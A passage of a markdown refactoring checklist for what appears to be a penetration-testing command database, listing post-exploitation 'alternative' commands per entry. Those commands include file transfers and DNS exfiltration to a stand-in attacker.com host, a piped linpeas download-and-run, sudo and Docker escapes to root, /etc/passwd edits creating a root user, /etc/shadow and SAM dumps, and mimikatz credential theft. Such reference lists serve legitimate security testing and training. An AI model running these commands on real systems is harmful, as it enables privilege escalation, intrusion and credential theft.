- [ ] **Action**: Replace with command IDs or create missing commands

### 273. `python-http-server`

- [ ] **Command ID**: `python-http-server`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `python2 -m SimpleHTTPServer <PORT>`
  - `php -S 0.0.0.0:<PORT>`
  - `ruby -run -e httpd . -p <PORT>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 274. `wget-download`

- [ ] **Command ID**: `wget-download`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `curl -O http://<LHOST>:<PORT>/<FILE>`
  - `fetch http://<LHOST>:<PORT>/<FILE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 275. `curl-upload`

- [ ] **Command ID**: `curl-upload`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `curl --upload-file <FILE> http://<LHOST>:<PORT>/`
  - `curl -T <FILE> ftp://<LHOST>/`
- [ ] **Action**: Replace with command IDs or create missing commands

### 276. `certutil-download`

- [ ] **Command ID**: `certutil-download`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `bitsadmin /transfer job http://<LHOST>/<FILE> C:\temp\<FILE>`
  - `powershell wget http://<LHOST>/<FILE> -OutFile <FILE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 277. `powershell-download`

- [ ] **Command ID**: `powershell-download`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `powershell wget http://<LHOST>/<FILE>`
  - `powershell curl http://<LHOST>/<FILE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 278. `smb-server`

- [ ] **Command ID**: `smb-server`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `python3 smbserver.py share .`
  - `samba service`
- [ ] **Action**: Replace with command IDs or create missing commands

### 279. `nc-file-transfer`

- [ ] **Command ID**: `nc-file-transfer`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `socat TCP-LISTEN:<LPORT> file:<FILE>,create`
  - `ncat -l <LPORT> > <FILE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 280. `base64-transfer`

- [ ] **Command ID**: `base64-transfer`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `xxd -p <FILE>`
  - `od -An -tx1 <FILE>`
  - `hexdump -ve '1/1 "%.2x"' <FILE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 281. `ftp-transfer`

- [ ] **Command ID**: `ftp-transfer`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `service vsftpd start`
  - `python -m SimpleHTTPServer`
- [ ] **Action**: Replace with command IDs or create missing commands

### 282. `scp-transfer`

- [ ] **Command ID**: `scp-transfer`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `rsync -avz file <USERNAME>@<TARGET>:/tmp/`
  - `sftp <USERNAME>@<TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 283. `php-download`

- [ ] **Command ID**: `php-download`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>`
  - `curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 284. `perl-download`

- [ ] **Command ID**: `perl-download`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `perl -e 'use File::Fetch; File::Fetch->new(uri=>"http://<LHOST>/<FILE>")->fetch();'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 285. `vbscript-download`

- [ ] **Command ID**: `vbscript-download`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `bitsadmin for newer Windows`
  - `certutil for Windows 7+`
- [ ] **Action**: Replace with command IDs or create missing commands

### 286. `debug-exe-transfer`

- [ ] **Command ID**: `debug-exe-transfer`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `certutil base64 encoding`
  - `PowerShell byte array`
- [ ] **Action**: Replace with command IDs or create missing commands

### 287. `dns-exfiltration`

- [ ] **Command ID**: `dns-exfiltration`
- [ ] **File**: `post-exploit/general-transfer.json`
- [ ] **Current alternatives (text)**:
  - `dig $data.attacker.com`
  - `host $data.attacker.com`
  - `ping $data.attacker.com`
- [ ] **Action**: Replace with command IDs or create missing commands

### 288. `enumerate-capabilities`

- [ ] **Command ID**: `enumerate-capabilities`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current alternatives (text)**:
  - `Manual search with find: find / -type f -perm /u=s,g=s 2>/dev/null (SUID instead)`
  - `Targeted search: getcap -r /usr/bin 2>/dev/null (faster, common location)`
  - `Check specific binary: getcap /usr/bin/python3 (test known binary)`
  - `Use linpeas.sh or linenum.sh for automated enumeration with capabilities check`
- [ ] **Action**: Replace with command IDs or create missing commands

### 289. `filter-exploitable-caps`

- [ ] **Command ID**: `filter-exploitable-caps`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current alternatives (text)**:
  - `Automated filtering with grep: getcap -r / 2>/dev/null | grep -E 'cap_(setuid|dac_override|dac_read_search|sys_admin|sys_ptrace)'`
  - `Use linpeas.sh capabilities module for automated classification`
  - `Check HackTricks capabilities page for comprehensive list with examples`
- [ ] **Action**: Replace with command IDs or create missing commands

### 290. `gtfobins-cap-lookup`

- [ ] **Command ID**: `gtfobins-cap-lookup`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current alternatives (text)**:
  - `HackTricks capabilities page: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities`
  - `Man pages: man 7 capabilities (understand what capability enables)`
  - `PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#capabilities`
  - `Search exploit-db for capability-based techniques`
- [ ] **Action**: Replace with command IDs or create missing commands

### 291. `execute-cap-exploit`

- [ ] **Command ID**: `execute-cap-exploit`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current alternatives (text)**:
  - `Try alternative binary with same capability if available`
  - `Use different exploitation technique for same capability/binary`
  - `Fallback to SUID enumeration if capabilities fail`
  - `Research manual exploitation without GTFOBins if binary undocumented`
- [ ] **Action**: Replace with command IDs or create missing commands

### 292. `verify-cap-access`

- [ ] **Command ID**: `verify-cap-access`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current alternatives (text)**:
  - `Test root file write: echo test > /etc/test_root_write 2>/dev/null && rm /etc/test_root_write`
  - `Test root directory access: ls -la /root 2>/dev/null`
  - `Test SSH key access: cat /root/.ssh/id_rsa 2>/dev/null`
  - `Test shadow file read: cat /etc/shadow 2>/dev/null | grep root`
  - `Test sudo without password: sudo -l (if sudoers allows)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 293. `cap-exploit-dac-override-passwd-edit`

- [ ] **Command ID**: `cap-exploit-dac-override-passwd-edit`
- [ ] **File**: `post-exploit/linux-capabilities-commands.json`
- [ ] **Current alternatives (text)**:
  - `Edit /etc/passwd to remove root password: root::0:0:root:/root:/bin/bash (then su root with no password)`
  - `Edit /etc/shadow instead if cap allows: remove root password hash`
  - `Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd`
  - `Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /`
- [ ] **Action**: Replace with command IDs or create missing commands

### 294. `check-docker-group`

- [ ] **Command ID**: `check-docker-group`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `cat /etc/group | grep docker`
  - `getent group docker`
- [ ] **Action**: Replace with command IDs or create missing commands

### 295. `check-docker-socket`

- [ ] **Command ID**: `check-docker-socket`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `stat /var/run/docker.sock`
  - `docker info`
  - `docker version`
- [ ] **Action**: Replace with command IDs or create missing commands

### 296. `list-docker-images`

- [ ] **Command ID**: `list-docker-images`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `docker image ls`
  - `docker pull alpine (if no images available)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 297. `docker-mount-escape`

- [ ] **Command ID**: `docker-mount-escape`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `docker run -v /:/host --rm -it <IMAGE_NAME> sh (then manually: chroot /host)`
  - `docker run --privileged -it <IMAGE_NAME> sh`
  - `docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh`
- [ ] **Action**: Replace with command IDs or create missing commands

### 298. `verify-docker-root`

- [ ] **Command ID**: `verify-docker-root`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `id (should show uid=0 if chrooted correctly)`
  - `whoami (should show root)`
  - `cat /mnt/etc/passwd`
- [ ] **Action**: Replace with command IDs or create missing commands

### 299. `docker-privileged-escape`

- [ ] **Command ID**: `docker-privileged-escape`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `docker-mount-escape (preferred method)`
  - `docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh`
- [ ] **Action**: Replace with command IDs or create missing commands

### 300. `docker-socket-mount`

- [ ] **Command ID**: `docker-socket-mount`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `docker-mount-escape (simpler)`
  - `Use image with docker client: docker pull docker:latest`
- [ ] **Action**: Replace with command IDs or create missing commands

### 301. `docker-pull-alpine`

- [ ] **Command ID**: `docker-pull-alpine`
- [ ] **File**: `post-exploit/linux-docker-commands.json`
- [ ] **Current alternatives (text)**:
  - `Use existing images from docker images`
  - `docker pull ubuntu (larger but more tools)`
  - `docker pull busybox (even smaller than alpine)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 302. `check-sudo-privs`

- [ ] **Command ID**: `check-sudo-privs`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `cat /etc/sudoers (if readable)`
  - `sudo -ll (detailed output)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 303. `gtfobins-sudo-lookup`

- [ ] **Command ID**: `gtfobins-sudo-lookup`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `Search exploit-db: searchsploit sudo <binary-name>`
  - `Google: '<binary-name> sudo privilege escalation'`
  - `HackTricks: https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo`
- [ ] **Action**: Replace with command IDs or create missing commands

### 304. `sudo-exploit-find`

- [ ] **Command ID**: `sudo-exploit-find`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `sudo find / -name '*' -exec /bin/bash \; -quit`
  - `sudo find . -exec /bin/sh \; -quit`
- [ ] **Action**: Replace with command IDs or create missing commands

### 305. `sudo-exploit-vim`

- [ ] **Command ID**: `sudo-exploit-vim`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `sudo vim (then type: :!/bin/bash)`
  - `sudo vim (then type: :set shell=/bin/bash then :shell)`
  - `sudo vi -c ':!/bin/bash'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 306. `sudo-exploit-python`

- [ ] **Command ID**: `sudo-exploit-python`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `sudo python -c 'import pty; pty.spawn("/bin/bash")'`
  - `sudo python -c 'import subprocess; subprocess.call(["/bin/bash"])'`
  - `sudo python3 -c 'import os; os.system("/bin/bash")'`
  - `sudo python2 -c 'import os; os.system("/bin/bash")'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 307. `sudo-exploit-less`

- [ ] **Command ID**: `sudo-exploit-less`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `sudo more /etc/profile (then !bash)`
  - `sudo man ls (then !bash)`
  - `sudo less /etc/passwd`
- [ ] **Action**: Replace with command IDs or create missing commands

### 308. `sudo-exploit-nmap`

- [ ] **Command ID**: `sudo-exploit-nmap`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `sudo nmap --script=<script>.nse (if script writable, inject command)`
  - `Check nmap version: nmap --version (if < 5.21, interactive works)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 309. `verify-root-access`

- [ ] **Command ID**: `verify-root-access`
- [ ] **File**: `post-exploit/linux-sudo-commands.json`
- [ ] **Current alternatives (text)**:
  - `ls -la /root/ (check if can list root directory)`
  - `cat /etc/shadow (attempt to read directly)`
  - `sudo -l (verify can run all commands as root)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 310. `filter-suid-binaries`

- [ ] **Command ID**: `filter-suid-binaries`
- [ ] **File**: `post-exploit/linux-suid-basic-commands.json`
- [ ] **Current alternatives (text)**:
  - `Manual review of find output`
- [ ] **Action**: Replace with command IDs or create missing commands

### 311. `gtfobins-suid-lookup`

- [ ] **Command ID**: `gtfobins-suid-lookup`
- [ ] **File**: `post-exploit/linux-suid-basic-commands.json`
- [ ] **Current alternatives (text)**:
  - `Search exploit-db: searchsploit <binary-name>`
  - `Manual binary analysis: strings /path/to/binary`
- [ ] **Action**: Replace with command IDs or create missing commands

### 312. `verify-root-access`

- [ ] **Command ID**: `verify-root-access`
- [ ] **File**: `post-exploit/linux-suid-basic-commands.json`
- [ ] **Current alternatives (text)**:
  - `ls -la /root/`
  - `cat /etc/shadow`
  - `sudo -l`
- [ ] **Action**: Replace with command IDs or create missing commands

### 313. `linux-privesc-linpeas`

- [ ] **Command ID**: `linux-privesc-linpeas`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Transfer linpeas.sh via file transfer methods`
  - `Use LinEnum if LinPEAS fails`
  - `Manual enumeration with individual commands`
- [ ] **Action**: Replace with command IDs or create missing commands

### 314. `linux-privesc-linenum`

- [ ] **Command ID**: `linux-privesc-linenum`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Use curl instead of wget`
  - `Upload via Python HTTP server`
  - `Use LinPEAS for more comprehensive scan`
- [ ] **Action**: Replace with command IDs or create missing commands

### 315. `linux-suid-find`

- [ ] **Command ID**: `linux-suid-find`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `find / -perm -4000 2>/dev/null`
  - `find / -user root -perm -4000 -exec ls -ldb {} \;`
- [ ] **Action**: Replace with command IDs or create missing commands

### 316. `linux-sudo-list`

- [ ] **Command ID**: `linux-sudo-list`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Check /etc/sudoers if readable`
  - `sudo -ll for detailed output`
- [ ] **Action**: Replace with command IDs or create missing commands

### 317. `linux-cron-enum`

- [ ] **Command ID**: `linux-cron-enum`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Use pspy to monitor processes`
  - `grep -r '/etc/cron' /etc/`
  - `systemctl list-timers`
- [ ] **Action**: Replace with command IDs or create missing commands

### 318. `linux-writable-etc-passwd`

- [ ] **Command ID**: `linux-writable-etc-passwd`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `openssl passwd -1 -salt salt password`
  - `echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd`
- [ ] **Action**: Replace with command IDs or create missing commands

### 319. `linux-capabilities`

- [ ] **Command ID**: `linux-capabilities`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Manual search in /usr/bin and /usr/sbin`
  - `Use LinPEAS which includes capability check`
- [ ] **Action**: Replace with command IDs or create missing commands

### 320. `linux-kernel-exploit`

- [ ] **Command ID**: `linux-kernel-exploit`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `cat /proc/version`
  - `lsb_release -a`
  - `hostnamectl`
- [ ] **Action**: Replace with command IDs or create missing commands

### 321. `linux-writable-services`

- [ ] **Command ID**: `linux-writable-services`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `ls -la /etc/systemd/system/*.service`
  - `systemctl list-unit-files`
- [ ] **Action**: Replace with command IDs or create missing commands

### 322. `linux-nfs-no-root-squash`

- [ ] **Command ID**: `linux-nfs-no-root-squash`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Use metasploit NFS scanner`
  - `nmap --script nfs-showmount`
- [ ] **Action**: Replace with command IDs or create missing commands

### 323. `linux-docker-escape`

- [ ] **Command ID**: `linux-docker-escape`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `docker run -v /:/hostfs -it ubuntu bash`
  - `LXC/LXD container escape if available`
- [ ] **Action**: Replace with command IDs or create missing commands

### 324. `linux-ld-preload`

- [ ] **Command ID**: `linux-ld-preload`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `LD_LIBRARY_PATH if LD_PRELOAD blocked`
  - `Create hijacking library for loaded .so`
- [ ] **Action**: Replace with command IDs or create missing commands

### 325. `linux-path-hijack`

- [ ] **Command ID**: `linux-path-hijack`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Library hijacking if PATH is protected`
  - `Symlink attacks for relative paths`
- [ ] **Action**: Replace with command IDs or create missing commands

### 326. `linux-ssh-keys`

- [ ] **Command ID**: `linux-ssh-keys`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `find / -name authorized_keys`
  - `grep -r 'PRIVATE KEY' /home 2>/dev/null`
- [ ] **Action**: Replace with command IDs or create missing commands

### 327. `linux-mysql-udf`

- [ ] **Command ID**: `linux-mysql-udf`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `Raptor UDF exploit`
  - `Write webshell via MySQL INTO OUTFILE`
- [ ] **Action**: Replace with command IDs or create missing commands

### 328. `linux-sudo-check`

- [ ] **Command ID**: `linux-sudo-check`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `sudo -ll`
  - `cat /etc/sudoers 2>/dev/null`
- [ ] **Action**: Replace with command IDs or create missing commands

### 329. `linux-cron-jobs`

- [ ] **Command ID**: `linux-cron-jobs`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `crontab -l`
  - `systemctl list-timers`
  - `grep -r . /etc/cron* 2>/dev/null`
- [ ] **Action**: Replace with command IDs or create missing commands

### 330. `linux-writable-passwd`

- [ ] **Command ID**: `linux-writable-passwd`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `test -w /etc/passwd && echo 'Writable!'`
  - `find /etc -writable 2>/dev/null`
- [ ] **Action**: Replace with command IDs or create missing commands

### 331. `linux-kernel-version`

- [ ] **Command ID**: `linux-kernel-version`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `hostnamectl`
  - `lsb_release -a`
  - `cat /etc/os-release`
- [ ] **Action**: Replace with command IDs or create missing commands

### 332. `linux-linpeas`

- [ ] **Command ID**: `linux-linpeas`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
  - `Transfer manually and run: ./linpeas.sh`
- [ ] **Action**: Replace with command IDs or create missing commands

### 333. `linux-pspy`

- [ ] **Command ID**: `linux-pspy`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `watch -n 1 'ps aux | grep -v grep'`
  - `while true; do ps aux | grep root; sleep 1; done`
- [ ] **Action**: Replace with command IDs or create missing commands

### 334. `linux-mysql-root`

- [ ] **Command ID**: `linux-mysql-root`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `mysql -u root -p (try blank password)`
  - `mariadb -u root`
- [ ] **Action**: Replace with command IDs or create missing commands

### 335. `linux-nfs-root-squash`

- [ ] **Command ID**: `linux-nfs-root-squash`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `showmount -e localhost`
  - `rpcinfo -p`
- [ ] **Action**: Replace with command IDs or create missing commands

### 336. `linux-systemctl-privesc`

- [ ] **Command ID**: `linux-systemctl-privesc`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `ls -la /bin/systemctl`
  - `getcap /bin/systemctl`
- [ ] **Action**: Replace with command IDs or create missing commands

### 337. `linux-wildcard-injection`

- [ ] **Command ID**: `linux-wildcard-injection`
- [ ] **File**: `post-exploit/linux.json`
- [ ] **Current alternatives (text)**:
  - `find /etc -name '*.sh' -exec grep '\*' {} \;`
- [ ] **Action**: Replace with command IDs or create missing commands

### 338. `win-privesc-winpeas`

- [ ] **Command ID**: `win-privesc-winpeas`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `PowerUp.ps1 for PowerShell-based enum`
  - `Windows-Exploit-Suggester`
  - `Manual enumeration commands`
- [ ] **Action**: Replace with command IDs or create missing commands

### 339. `win-privesc-powerup`

- [ ] **Command ID**: `win-privesc-powerup`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Upload PowerUp.ps1 and import locally`
  - `Use individual PowerUp functions`
  - `WinPEAS if PowerShell is blocked`
- [ ] **Action**: Replace with command IDs or create missing commands

### 340. `win-systeminfo`

- [ ] **Command ID**: `win-systeminfo`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `wmic os get Caption,CSDVersion,OSArchitecture`
  - `Get-ComputerInfo (PowerShell)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 341. `win-unquoted-service-paths`

- [ ] **Command ID**: `win-unquoted-service-paths`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `PowerUp's Get-UnquotedService`
  - `Manual check with: sc qc <servicename>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 342. `win-weak-service-perms`

- [ ] **Command ID**: `win-weak-service-perms`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `PowerUp's Get-ModifiableServiceFile`
  - `icacls to check file permissions`
  - `Get-Acl in PowerShell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 343. `win-always-install-elevated`

- [ ] **Command ID**: `win-always-install-elevated`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `PowerUp's Get-RegistryAlwaysInstallElevated`
  - `Manual MSI creation with WiX Toolset`
- [ ] **Action**: Replace with command IDs or create missing commands

### 344. `win-registry-autologon`

- [ ] **Command ID**: `win-registry-autologon`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
  - `Get-ItemProperty for PowerShell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 345. `win-scheduled-tasks`

- [ ] **Command ID**: `win-scheduled-tasks`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Get-ScheduledTask in PowerShell`
  - `accesschk on task binaries`
- [ ] **Action**: Replace with command IDs or create missing commands

### 346. `win-dll-hijacking`

- [ ] **Command ID**: `win-dll-hijacking`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `PowerUp's Find-ProcessDLLHijack`
  - `Process Monitor (procmon) from Sysinternals`
- [ ] **Action**: Replace with command IDs or create missing commands

### 347. `win-potato-exploits`

- [ ] **Command ID**: `win-potato-exploits`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `JuicyPotato.exe -l 1337 -p cmd.exe -t *`
  - `PrintSpoofer.exe -i -c cmd`
  - `GodPotato, SweetPotato variants`
- [ ] **Action**: Replace with command IDs or create missing commands

### 348. `win-kernel-exploits`

- [ ] **Command ID**: `win-kernel-exploits`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Watson (PowerShell-based)`
  - `Sherlock.ps1 for older Windows`
  - `Manual searchsploit of OS version`
- [ ] **Action**: Replace with command IDs or create missing commands

### 349. `win-saved-credentials`

- [ ] **Command ID**: `win-saved-credentials`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `mimikatz: vault::list`
  - `rundll32 keymgr.dll,KRShowKeyMgr`
- [ ] **Action**: Replace with command IDs or create missing commands

### 350. `win-password-files`

- [ ] **Command ID**: `win-password-files`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `findstr /si password *.txt *.xml *.ini`
  - `PowerShell: Get-ChildItem -Recurse | Select-String -Pattern 'password'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 351. `win-sam-system-backup`

- [ ] **Command ID**: `win-sam-system-backup`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Copy from C:\Windows\Repair\`
  - `Copy from Volume Shadow Copies`
  - `Use mimikatz lsadump::sam`
- [ ] **Action**: Replace with command IDs or create missing commands

### 352. `win-group-membership`

- [ ] **Command ID**: `win-group-membership`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Get-LocalGroupMember in PowerShell`
  - `Check domain groups: net user /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 353. `windows-whoami-privs`

- [ ] **Command ID**: `windows-whoami-privs`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `whoami /all`
  - `net user %username%`
  - `Get-ADUser $env:USERNAME`
- [ ] **Action**: Replace with command IDs or create missing commands

### 354. `windows-systeminfo`

- [ ] **Command ID**: `windows-systeminfo`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `ver`
  - `wmic os get Caption,Version,BuildNumber`
  - `Get-ComputerInfo`
- [ ] **Action**: Replace with command IDs or create missing commands

### 355. `windows-unquoted-service`

- [ ] **Command ID**: `windows-unquoted-service`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Get-WmiObject win32_service | Select Name, PathName`
  - `sc qc <service>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 356. `windows-alwaysinstallelevated`

- [ ] **Command ID**: `windows-alwaysinstallelevated`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer`
  - `PowerUp.ps1 Invoke-AllChecks`
- [ ] **Action**: Replace with command IDs or create missing commands

### 357. `windows-scheduled-tasks`

- [ ] **Command ID**: `windows-scheduled-tasks`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Get-ScheduledTask | Select TaskName,Principal`
  - `dir C:\Windows\System32\Tasks`
- [ ] **Action**: Replace with command IDs or create missing commands

### 358. `windows-service-permissions`

- [ ] **Command ID**: `windows-service-permissions`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `sc sdshow <service>`
  - `Get-Acl HKLM:\System\CurrentControlSet\Services\<service>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 359. `windows-potato-attacks`

- [ ] **Command ID**: `windows-potato-attacks`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `PrintSpoofer.exe -i -c cmd`
  - `SweetPotato.exe -p cmd`
- [ ] **Action**: Replace with command IDs or create missing commands

### 360. `windows-sam-system-backup`

- [ ] **Command ID**: `windows-sam-system-backup`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `reg save HKLM\SAM sam.save`
  - `reg save HKLM\SYSTEM system.save`
- [ ] **Action**: Replace with command IDs or create missing commands

### 361. `windows-stored-credentials`

- [ ] **Command ID**: `windows-stored-credentials`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\`
  - `vaultcmd /listcreds:"Windows Credentials"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 362. `windows-dpapi-masterkeys`

- [ ] **Command ID**: `windows-dpapi-masterkeys`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `SharpDPAPI.exe masterkeys`
  - `mimikatz dpapi::masterkey`
- [ ] **Action**: Replace with command IDs or create missing commands

### 363. `windows-autologon`

- [ ] **Command ID**: `windows-autologon`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
  - `netpass.exe`
- [ ] **Action**: Replace with command IDs or create missing commands

### 364. `windows-pass-the-hash`

- [ ] **Command ID**: `windows-pass-the-hash`
- [ ] **File**: `post-exploit/windows.json`
- [ ] **Current alternatives (text)**:
  - `sekurlsa::pth /user:admin /ntlm:<hash> /domain:.`
  - `Invoke-Mimikatz -DumpCreds`
- [ ] **Action**: Replace with command IDs or create missing commands

### 365. `windows-kerberoasting`

